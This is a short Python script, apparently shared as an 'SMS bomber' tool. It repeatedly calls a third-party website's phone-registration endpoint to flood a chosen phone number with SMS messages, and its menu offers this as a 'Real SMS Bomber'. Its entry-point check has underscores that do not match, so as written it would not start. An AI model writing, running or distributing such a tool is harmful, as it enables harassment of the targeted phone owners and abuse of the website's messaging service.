import requests
import os
import time

def banner():
    os.system('clear')
    print("========================================")
    print("        WELCOME TO X-BOOM TOOL          ")
    print("     Created by: mmalekislam788         ")
    print("========================================")

def send_sms(target, count):
    url = "https://bikroy.com/data/is-pno-registered-login"
    params = {"phone": target}
    for i in range(count):
        try:
            requests.get(url, params=params)
            print(f"[!] SMS {i+1} sent!")
        except:
            print(f"[-] Error at {i+1}")
        time.sleep(2)

def main():
    banner()
    print("\n[1] Real SMS Bomber")
    print("[2] Exit")
    choice = input("\nSelect: ")
    if choice == '1':
        number = input("Number: ")
        amount = int(input("Amount: "))
        send_sms(number, amount)

if _name_ == "_main_":
    main()
            
